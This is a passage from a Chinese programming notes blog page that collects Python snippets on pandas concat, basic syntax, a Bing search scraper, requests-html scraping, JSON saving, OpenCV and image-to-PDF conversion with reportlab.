class="line">SHA1 也是一样的用法。https:<span class="comment">//p0sec.net/index.php/archives/33/</span></span><br></pre></td></tr></table></figure>
<h3 id="concat-组合-dataframe"><a href="#concat-组合-dataframe" class="headerlink" title="concat 组合 dataframe"></a>concat 组合 dataframe</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> pandas <span class="keyword">as</span> pd</span><br><span class="line">india_weather = pd.DataFrame(&#123;</span><br><span class="line">    <span class="string">'city'</span>: [<span class="string">'mumbai'</span>, <span class="string">'delhi'</span>, <span class="string">'banglore'</span>],</span><br><span class="line">    <span class="string">'temperature'</span>: [<span class="number">32</span>, <span class="number">34</span>, <span class="number">30</span>],</span><br><span class="line">    <span class="string">'humidity'</span>: [<span class="number">80</span>, <span class="number">60</span>, <span class="number">72</span>]</span><br><span class="line">&#125;)</span><br><span class="line">us_weather = pd.DataFrame(&#123;</span><br><span class="line">    <span class="string">'city'</span>: [<span class="string">'newyork'</span>, <span class="string">'chicago'</span>, <span class="string">'orlando'</span>],</span><br><span class="line">    <span class="string">'temperature'</span>: [<span class="number">21</span>, <span class="number">24</span>, <span class="number">32</span>],</span><br><span class="line">    <span class="string">'humidity'</span>: [<span class="number">68</span>, <span class="number">65</span>, <span class="number">70</span>]</span><br><span class="line">&#125;)</span><br><span class="line">df = pd.concat([india_weather, us_weather])</span><br><span class="line">df = pd.concat([india_weather, us_weather], ignore_index=True)</span><br><span class="line"></span><br><span class="line">df = pd.concat([india_weather, us_weather], keys=[<span class="string">'india'</span>, <span class="string">'us'</span>])</span><br><span class="line"></span><br><span class="line">df.loc[<span class="string">'india'</span>]</span><br><span class="line">df = pd.concat([temperature_df, windspeed_df], axis=<span class="number">1</span>)</span><br><span class="line">https:<span class="comment">//learnku.com/articles/26025</span></span><br></pre></td></tr></table></figure>
<h3 id="数学问题"><a href="#数学问题" class="headerlink" title="数学问题"></a>数学问题</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">数学问题：假如一个星球有 <span class="number">100</span> 人，每年人数翻一倍。那么，多少年之后人数才有 <span class="number">100</span> 万人</span><br><span class="line">&gt;&gt;&gt; p=<span class="number">100</span></span><br><span class="line">&gt;&gt;&gt; y=<span class="number">0</span></span><br><span class="line">&gt;&gt;&gt; <span class="keyword">while</span> p&lt;<span class="number">1000000</span>:</span><br><span class="line">...       p*=<span class="number">2</span></span><br><span class="line">...       y+=<span class="number">1</span></span><br><span class="line">...</span><br><span class="line">&gt;&gt;&gt; y</span><br><span class="line"><span class="number">14</span></span><br></pre></td></tr></table></figure>
<h3 id="Python语法速查"><a href="#Python语法速查" class="headerlink" title="Python语法速查"></a>Python语法速查</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="comment">//www.ikeguang.com/2019/03/17/python-sytnax/</span></span><br><span class="line">a = [<span class="number">1</span>, <span class="number">2</span>]</span><br><span class="line">b = a</span><br><span class="line">print(id(a) - id(b))  # 地址差为 0，表示实质是同址的</span><br><span class="line"><span class="number">0</span></span><br><span class="line">b.append(<span class="number">3</span>)</span><br><span class="line">print(a)  # 只改动了 b，但 a 也跟着变动了</span><br><span class="line">[<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>]</span><br><span class="line">a is b</span><br><span class="line">True</span><br><span class="line">使用切片来重新分配空间：</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line">a is a[:]</span><br><span class="line">False</span><br><span class="line">运算两数中只要有一个浮点数，结果就是浮点数；</span><br><span class="line">整数相除，即使能除尽，结果也是浮点数；</span><br><span class="line">Python 内部的机制解决了整数溢出的问题，不用担心。</span><br><span class="line">序列主要包括字符串（str）、列表（list）与元祖（tuple）三类。</span><br><span class="line">&gt;&gt;&gt; <span class="string">'ab'</span>.index(<span class="string">'b'</span>)</span><br><span class="line"><span class="number">1</span></span><br><span class="line">&gt;&gt;&gt; <span class="string">'b'</span> <span class="keyword">in</span> <span class="string">'ab'</span></span><br><span class="line">True</span><br><span class="line">&gt;&gt;&gt; max([<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>])</span><br><span class="line"><span class="number">3</span></span><br><span class="line">s = " I love Python"  # 首位是空格</span><br><span class="line">lst = s.split(<span class="string">' '</span>)</span><br><span class="line">lst1 = <span class="string">'-'</span>.join(lst)</span><br><span class="line">strip() 去掉字符串首尾两端的空格。方法 lstrip()/rstrip() 则只切除首端/尾端的空格。</span><br><span class="line"><span class="string">'I like &#123;&#125; and &#123;&#125;'</span>.format(<span class="string">'Python'</span>, <span class="string">'you'</span>)</span><br><span class="line"><span class="string">'I like Python and you'</span></span><br><span class="line">'&#123;0&#125; + &#123;2&#125; = &#123;1&#125;'.format (10, 20, 'Python ')  # 按顺序引用</span><br><span class="line"><span class="string">'10 + Python  = 20'</span></span><br><span class="line">'&#123;0&#125; * &#123;1&#125; = &#123;0&#125;'.format (10, 'Python ')  # 编号反复引用</span><br><span class="line"><span class="string">'10 * Python  = 10'</span></span><br></pre></td></tr></table></figure>
<h3 id="bing搜索"><a href="#bing搜索" class="headerlink" title="bing搜索"></a>bing搜索</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests, re, time, webbrowser, codecs</span><br><span class="line">print(<span class="string">'==========搜索引擎=========='</span>)</span><br><span class="line">time.sleep(<span class="number">0.7</span>)</span><br><span class="line">headers = &#123;<span class="string">'Accept'</span>:<span class="string">'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8'</span>, </span><br><span class="line"> <span class="string">'Accept-Encoding'</span>:<span class="string">'gzip, deflate, sdch'</span>, </span><br><span class="line"> <span class="string">'Accept-Language'</span>:<span class="string">'zh-CN,zh;q=0.8'</span>, </span><br><span class="line"> <span class="string">'Cache-Control'</span>:<span class="string">'max-age=0'</span>, </span><br><span class="line"> <span class="string">'Connection'</span>:<span class="string">'keep-alive'</span>, </span><br><span class="line"> <span class="string">'Cookie'</span>:<span class="string">'SRCHD=AF=NOFORM; SRCHUID=V=2&amp;GUID=E4CB65F3BD7F4EC7922E3642567A39EC&amp;dmnchg=1; _EDGE_V=1; MUID=24CC781F18B266D70F9C758D199C670F; MUIDB=24CC781F18B266D70F9C758D199C670F; SRCHUSR=DOB=20190707&amp;T=1562487393000; SNRHOP=I=&amp;TS=; _EDGE_S=mkt=zh-cn&amp;SID=2C85ED242A1D66051D4FE0B62B33673B; _SS=SID=2C85ED242A1D66051D4FE0B62B33673B&amp;HV=1562490664; SRCHHPGUSR=CW=1089&amp;CH=1742&amp;DPR=1&amp;UTC=480&amp;WTS=63698084193&amp;PR=3'</span>, </span><br><span class="line"> <span class="string">'DNT'</span>:<span class="string">'1'</span>, </span><br><span class="line"> <span class="string">'Host'</span>:<span class="string">'cn.bing.com'</span>, </span><br><span class="line"> <span class="string">'Upgrade-Insecure-Requests'</span>:<span class="string">'1'</span>, </span><br><span class="line"> <span class="string">'User-Agent'</span>:<span class="string">'Mozilla/5.0 (iPhone; CPU iPhone OS 9_1 like Mac OS X) AppleWebKit/601.1.46 (KHTML, like Gecko) Version/9.0 Mobile/13B143 Safari/601.1'</span>&#125;</span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">while</span> True:</span><br><span class="line">            web_ids = &#123;&#125;</span><br><span class="line">            test = []</span><br><span class="line">            search = input(<span class="string">'输入搜索的内容：'</span>)</span><br><span class="line">            page = [<span class="number">11</span>, <span class="number">21</span>, <span class="number">31</span>, <span class="number">41</span>, <span class="number">51</span>]</span><br><span class="line"></span><br><span class="line">            def <span class="keyword">catch</span>():</span><br><span class="line">                global webs</span><br><span class="line">                id_times = <span class="number">0</span></span><br><span class="line">                <span class="keyword">for</span> t <span class="keyword">in</span> page:</span><br><span class="line">                    url = <span class="string">'https://cn.bing.com/search?q='</span> + search + <span class="string">'&amp;qs=n&amp;sp=-1&amp;pq&amp;sc=0-5&amp;sk=&amp;cvid=275512403280414F9363B7CDC7368CBD&amp;first='</span> + str(t) + <span class="string">'&amp;FORM=PERE'</span></span><br><span class="line">                    text = requests.get(url, headers=headers).text</span><br><span class="line">                    a1 = <span class="string">'&lt;h2&gt;(.*?)&lt;/h2&gt;'</span></span><br><span class="line">                    a2 = <span class="string">'href="(.*?)"'</span></span><br><span class="line">                    a3 = <span class="string">'&gt;(.*?)&lt;/a&gt;'</span></span><br><span class="line">                    title = re.findall(a1, text)</span><br><span class="line">                    <span class="keyword">for</span> j <span class="keyword">in</span> title:</span><br><span class="line">                        id_times = id_times + <span class="number">1</span></span><br><span class="line">                        title = re.findall(a3, j)</span><br><span class="line">                        webs = re.findall(a2, j)</span><br><span class="line">                        web_ids[id_times] = webs</span><br><span class="line">                        print(id_times, title[<span class="number">0</span>])</span><br><span class="line">                        print(<span class="string">'网址：%s'</span> % webs[<span class="number">0</span>])</span><br><span class="line">                        print()</span><br><span class="line">                        <span class="keyword">if</span> len(webs) &gt; <span class="number">0</span>:</span><br><span class="line">                            test.append(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">                <span class="keyword">if</span> len(test) &gt; <span class="number">0</span>:</span><br><span class="line">                    print(<span class="string">'打开网址（如需打开多个网址，请用英文符号“,”，使用其它键默认不打开任何网址）'</span>)</span><br><span class="line">                    open_web = input(<span class="string">'网址编号：'</span>).split(<span class="string">','</span>)</span><br><span class="line">                    <span class="keyword">if</span> <span class="string">'n'</span> not <span class="keyword">in</span> open_web:</span><br><span class="line">                        <span class="keyword">for</span> aweb <span class="keyword">in</span> open_web:</span><br><span class="line">                            <span class="keyword">if</span> aweb.isdigit():</span><br><span class="line">                                ty = int(aweb)</span><br><span class="line">                                <span class="keyword">if</span> ty <span class="keyword">in</span> web_ids:</span><br><span class="line">                                    web = web_ids[ty]</span><br><span class="line">                                    webbrowser.open(web[<span class="number">0</span>])</span><br><span class="line"></span><br><span class="line">                    <span class="keyword">else</span>:</span><br><span class="line">                        print(<span class="string">'没有符合您的搜索结果！'</span>)</span><br><span class="line">                    print(<span class="string">'=============================='</span>)</span><br><span class="line"></span><br><span class="line">            <span class="keyword">catch</span>()</span><br><span class="line"></span><br><span class="line">    except KeyboardInterrupt:</span><br><span class="line">        exit()</span><br><span class="line"></span><br><span class="line">except requests.exceptions.ConnectionError:</span><br><span class="line">    print(<span class="string">'抱歉，网络出现了一点问题！'</span>)<span class="comment">//https://learnku.com/articles/32422</span></span><br><span class="line">    time.sleep(<span class="number">3</span>)</span><br><span class="line">    exit()</span><br></pre></td></tr></table></figure>
<h3 id="requests-html"><a href="#requests-html" class="headerlink" title="requests-html"></a>requests-html</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br></pre></td><td class="code"><pre><span class="line">pip install requests-html</span><br><span class="line"><span class="keyword">from</span> requests_html <span class="keyword">import</span> HTMLSession</span><br><span class="line">session = HTMLSession()</span><br><span class="line"># GET请求</span><br><span class="line">url = <span class="string">"http://kaoshi.edu.sina.com.cn/college/scorelist?tab=batch&amp;wl=1&amp;local=2&amp;batch=&amp;syear=2013"</span></span><br><span class="line">r = session.get(url)</span><br><span class="line">r.encoding='utf-8'  # 解决中文乱码问题</span><br><span class="line">print(r.text)</span><br><span class="line"># 获取的网页的内容存储到本地</span><br><span class="line"><span class="keyword">with</span> open(<span class="string">'test.html'</span>,<span class="string">'wb'</span>) <span class="keyword">as</span> f:</span><br><span class="line">    f.write(r.content)</span><br><span class="line"></span><br><span class="line"># POST请求</span><br><span class="line">url = <span class="string">'https://shuju.wdzj.com/plat-info-target.html'</span></span><br><span class="line">params = &#123;<span class="string">'wdzjPlatId'</span>: <span class="number">59</span>,<span class="string">'type'</span>: <span class="number">1</span>, <span class="string">'target1'</span>: <span class="number">1</span>, <span class="string">'target2'</span>: <span class="number">0</span>&#125;</span><br><span class="line">r = session.post(url, params=params)</span><br><span class="line">print(r.text)</span><br><span class="line"></span><br><span class="line">###定制请求头</span><br><span class="line">headers = &#123;<span class="string">'user-agent'</span>: <span class="string">'my-app/0.0.1'</span>&#125;</span><br><span class="line">r = session.get(url, headers=headers)</span><br><span class="line">r = session.get(<span class="string">'http://www.w3school.com.cn'</span>)</span><br><span class="line">print(r.html.links)</span><br><span class="line"></span><br><span class="line"># 输出 (太多，中间省略部分)</span><br><span class="line">&#123;<span class="string">'http://www.w3ctech.com/'</span>, <span class="string">'/glossary/index.asp'</span>, <span class="string">'/html5/html5_quiz.asp'</span>, <span class="string">'/php/index.asp'</span>, <span class="string">'/asp/index.asp'</span>, <span class="string">'/php/php_ref_date.asp'</span>, <span class="string">'http://wetest.qq.com/?from=links_w3school'</span>, <span class="string">'/asp/asp_ref.asp'</span>, <span class="string">'/tags/index.asp'</span>, <span class="string">'/xmldom/index.asp'</span>, <span class="string">'/example/csse_examples.asp'</span>, <span class="string">'/w.asp'</span>, <span class="string">'/index.html'</span>, <span class="string">'http://weibo.com/w3schoolcomcn'</span>, <span class="string">'/ws.asp'</span>, <span class="string">'/b.asp'</span>, <span class="string">'/cssref/index.asp'</span>, <span class="string">'/jquerymobile/index.asp'</span>,</span><br><span class="line">...</span><br><span class="line"><span class="string">'/xsl/xsl_languages.asp'</span>,</span><br><span class="line"><span class="string">'/example/html_examples.asp'</span>&#125;</span><br><span class="line"></span><br><span class="line"># 获取绝对地址</span><br><span class="line">t = r.html.absolute_links</span><br><span class="line">print(t)</span><br><span class="line">&#123;<span class="string">'http://www.w3school.com.cn/media/index.asp'</span>,</span><br><span class="line"><span class="string">'http://www.w3school.com.cn/glossary/index.asp'</span>,</span><br><span class="line"><span class="string">'http://www.w3school.com.cn/php/php_ref.asp'</span>,</span><br><span class="line"><span class="string">'http://www.w3school.com.cn/site/index.asp'</span>,</span><br><span class="line">...</span><br><span class="line"><span class="string">'http://www.w3school.com.cn/asp/asp_quiz.asp'</span>&#125;</span><br><span class="line"># 获取3cschoool首页左侧的菜单列表  first=True表示找到的第一个‘HTML教程’</span><br><span class="line">menuList = r.html.find(<span class="string">'#navsecond &gt; ul'</span>, first=True)</span><br><span class="line">print(menuList.text)</span><br><span class="line"></span><br><span class="line"># 输出</span><br><span class="line">HTML</span><br><span class="line">HTML5</span><br><span class="line">XHTML</span><br><span class="line">CSS</span><br><span class="line">CSS3</span><br><span class="line">TCP/IP</span><br><span class="line"></span><br><span class="line"># 找出所有菜单的标题和链接</span><br><span class="line">menuList = r.html.find(<span class="string">'#navsecond &gt; ul'</span>)</span><br><span class="line"><span class="keyword">for</span> menu <span class="keyword">in</span> menuList:</span><br><span class="line">    print(menu.text)  # 获得标题</span><br><span class="line">    print(menu.absolute_links)  # 获得链接</span><br><span class="line"></span><br><span class="line"># 输出</span><br><span class="line">HTML</span><br><span class="line">HTML5</span><br><span class="line">XHTML</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> requests_html <span class="keyword">import</span> HTMLSession</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">session = HTMLSession()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># 背景图片地址</span><br><span class="line">url = <span class="string">"http://www.win4000.com/wallpaper_2285_0_10_1.html"</span></span><br><span class="line">r = session.get(url)</span><br><span class="line"></span><br><span class="line"># 新建bg文件夹</span><br><span class="line"><span class="keyword">if</span> not os.path.exists(<span class="string">'bg'</span>):</span><br><span class="line">    os.mkdir(<span class="string">'bg'</span>)</span><br><span class="line"></span><br><span class="line"># 保存图片到bg/目录</span><br><span class="line">def save_image(url, title):</span><br><span class="line">    img_response = requests.get(url)</span><br><span class="line">    <span class="keyword">with</span> open(<span class="string">'./bg/'</span>+title+<span class="string">'.jpg'</span>, <span class="string">'wb'</span>) <span class="keyword">as</span> file:</span><br><span class="line">        file.write(img_response.content)</span><br><span class="line"></span><br><span class="line"># 查找页面中图片列表，找到链接，</span><br><span class="line"># 点击链接，访问查看大图，并获取大图地址pic-large</span><br><span class="line">items_img = r.html.find(<span class="string">'ul.clearfix &gt; li &gt; a'</span>)</span><br><span class="line"><span class="keyword">for</span> img <span class="keyword">in</span> items_img:</span><br><span class="line">    img_url = img.attrs[<span class="string">'href'</span>]</span><br><span class="line">    <span class="keyword">if</span> <span class="string">"/wallpaper_detail"</span> <span class="keyword">in</span> img_url:</span><br><span class="line">        r = session.get(img_url)          # 解析图片详情</span><br><span class="line">        item_img = r.html.find(<span class="string">'img.pic-large'</span>, first=True)</span><br><span class="line">        url = item_img.attrs['src']       # 大图图片地址</span><br><span class="line">        title = item_img.attrs['title']   # 图片标题</span><br><span class="line">        print(url+title)</span><br><span class="line">        save_image(url, title)</span><br><span class="line">        </span><br><span class="line">http:<span class="comment">//www.golang365.com/#/blog/17</span></span><br></pre></td></tr></table></figure>
<h3 id="输出今天日期"><a href="#输出今天日期" class="headerlink" title="输出今天日期"></a>输出今天日期</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line"># 获取今天年月日</span><br><span class="line">nowdate = time.localtime(time.time())  # 获得当前时间戳</span><br><span class="line">today = time.strftime('%Y-%m-%d %H:%M:%S', nowdate)  # 转换成指定格式</span><br><span class="line">print(today)</span><br></pre></td></tr></table></figure>
<h3 id="保存json文件"><a href="#保存json文件" class="headerlink" title="保存json文件"></a>保存json文件</h3><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> io</span><br><span class="line"></span><br><span class="line">sendData = [</span><br><span class="line">  &#123;</span><br><span class="line">    id: <span class="number">1</span>,</span><br><span class="line">    name: <span class="string">'奥特曼'</span></span><br><span class="line">  &#125;,&#123;</span><br><span class="line">    id: <span class="number">2</span>,</span><br><span class="line">    name: <span class="string">'小怪兽'</span></span><br><span class="line">  &#125;</span><br><span class="line">]</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> io.open(<span class="string">'data.json'</span>, <span class="string">'w'</span>, encoding=<span class="string">"utf-8"</span>) <span class="keyword">as</span> file:</span><br><span class="line">    json.dump(sendData, file, ensure_ascii=False, sort_keys=True, indent=<span class="number">2</span>)</span><br><span class="line">print('保存成功')#http://www.golang365.com/#/blog/18</span><br></pre></td></tr></table></figure>
<h3 id="openCV"><a href="#openCV" class="headerlink" title="openCV"></a>openCV</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">pip install --upgrade setuptools</span><br><span class="line"></span><br><span class="line">pip install numpy Matplotlib</span><br><span class="line"></span><br><span class="line">pip install opencv-python</span><br><span class="line">如果多次下载失败，可以从 http:<span class="comment">//www.lfd.uci.edu/~gohlke/pythonlibs/ 直接下载whl包安装，安装whl包依然使用pip</span></span><br><span class="line"></span><br><span class="line">#导入cv模块</span><br><span class="line"><span class="keyword">import</span> cv2 <span class="keyword">as</span> cv</span><br><span class="line">#读取图像，支持 bmp、jpg、png、tiff 等常用格式</span><br><span class="line">img = cv.imread(r<span class="string">"E:\python\test.jpg"</span>)</span><br><span class="line">#创建窗口并显示图像</span><br><span class="line">cv.namedWindow(<span class="string">"Image"</span>)</span><br><span class="line">cv.imshow(<span class="string">"Image"</span>,img)</span><br><span class="line">cv.waitKey(<span class="number">0</span>)</span><br><span class="line">#释放窗口</span><br><span class="line">cv2.destroyAllWindows() </span><br><span class="line">http:<span class="comment">//www.golang365.com/#/blog/19</span></span><br></pre></td></tr></table></figure>
<h3 id="图片转pdf"><a href="#图片转pdf" class="headerlink" title="图片转pdf"></a>图片转pdf</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line">pip install reportlab</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">from</span> reportlab.pdfgen <span class="keyword">import</span> canvas</span><br><span class="line"></span><br><span class="line"># 生成多页pdf 生成一个3页的pdf文件</span><br><span class="line">def texttopdf():</span><br><span class="line">    c = canvas.Canvas(<span class="string">'text.pdf'</span>)</span><br><span class="line">    c.drawString(<span class="number">100</span>, <span class="number">100</span>, <span class="string">"Some text in first page."</span>)</span><br><span class="line">    c.showPage()</span><br><span class="line">    c.drawString(<span class="number">100</span>, <span class="number">100</span>, <span class="string">"Some text in second page."</span>)</span><br><span class="line">    c.showPage()</span><br><span class="line">    c.drawString(<span class="number">100</span>, <span class="number">100</span>, <span class="string">"Some text in third page"</span>)</span><br><span class="line">    c.showPage()</span><br><span class="line">    c.save()</span><br><span class="line"></span><br><span class="line">texttopdf()</span><br><span class="line">print(<span class="string">'转换成功！'</span>)</span><br><span class="line"></span><br><span class="line"># 单张图片转pdf，图片不失真。比较清晰</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">from</span> reportlab.lib.pagesizes <span class="keyword">import</span> portrait</span><br><span class="line"><span class="keyword">from</span> reportlab.pdfgen <span class="keyword">import</span> canvas</span><br><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line"></span><br><span class="line"># 如果有输指定文件则转换参数里的图片，否则转换test.jpg文件</span><br><span class="line"><span class="keyword">if</span> len(sys.argv) &gt; <span class="number">1</span>:</span><br><span class="line">    img = sys.argv[<span class="number">1</span>]</span><br><span class="line">    filename = img.split(<span class="string">'.'</span>)[<span class="number">0</span>]</span><br><span class="line">    f_jpg = filename+<span class="string">'.jpg'</span></span><br><span class="line">    f_pdf = filename+<span class="string">'.pdf'</span></span><br><span class="line">    print(f_jpg)</span><br><span class="line"></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    img = <span class="string">'wechat.png'</span></span><br><span class="line">    f_pdf = <span class="string">'test.pdf'</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def imgtopdf():</span><br><span class="line">    (maxw, maxh) = Image.open(img).size</span><br><span class="line">    c = canvas.Canvas(f_pdf, pagesize=(maxw, maxh))</span><br><span class="line">    c.drawImage(img, <span class="number">0</span>, <span class="number">0</span>, maxw, maxh)</span><br><span class="line">    c.showPage()</span><br><span class="line">    c.save()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">imgtopdf()</span><br><span class="line">print(<span class="string">'转换成功！'</span>)</span><br><span class="line">https:<span class="comment">//github.com/sweida/python-study/tree/master/imgToPdf</span></span><br><span class="line">http:<span class="comment">//www.golang365.com/#/blog/22</span></span><br></pre></td></tr></table></figure>
